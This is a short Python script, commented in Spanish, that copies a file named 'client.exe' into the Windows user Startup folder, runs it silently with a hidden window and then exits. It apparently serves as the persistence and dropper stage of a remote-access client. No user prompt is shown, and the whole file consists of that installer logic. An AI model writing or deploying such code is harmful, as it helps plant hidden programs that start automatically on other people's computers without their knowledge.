import os
import shutil
import ctypes
import sys
import winshell
import time

# Define el nombre del archivo 'client' que se copiará
CLIENT_SCRIPT_NAME = 'client.exe'  # Cambia esto si es necesario (por ejemplo, 'client.py')

def get_executable_dir():
    # Obtiene el directorio del ejecutable
    if getattr(sys, 'frozen', False):
        exe_dir = os.path.dirname(sys.executable)
        return exe_dir
    
    else:
        # El script está ejecutándose en modo de script
        return os.path.dirname(os.path.abspath(__file__))

def run_autorun(file_path):
    ctypes.windll.shell32.ShellExecuteW(None, "open", file_path, None, None, 0)

def copy_script_to_startup():
    # Obtiene el directorio del ejecutable
    script_dir = get_executable_dir()
    
    # Define el nombre del archivo 'client'
    client_script_name = CLIENT_SCRIPT_NAME
    
    # Obtiene el directorio de inicio del usuario
    startup_dir = winshell.startup()
    
    # Construye la ruta completa del archivo de destino en el directorio de inicio
    destination_path = os.path.join(startup_dir, client_script_name)
    
    # Construye la ruta completa del archivo 'client' en el directorio del script
    client_script_path = os.path.join(script_dir, client_script_name)
    
    # Copia el archivo 'client' al directorio de inicio, sobrescribiendo si es necesario
    try:
        if os.path.isfile(client_script_path):
            shutil.copy2(client_script_path, destination_path)
            print(f"Archivo 'client' copiado a {destination_path}")
            
            # Ejecuta el archivo copiado
            run_autorun(destination_path)
            
            # Cierra el script actual
            ctypes.windll.kernel32.ExitProcess(0)
        else:
            print(f"Archivo 'client' no encontrado en {client_script_path}")

    except Exception as e:
        print(f"Error al copiar o ejecutar el archivo 'client': {e}")

# Llama a la función para copiar el archivo 'client'
copy_script_to_startup()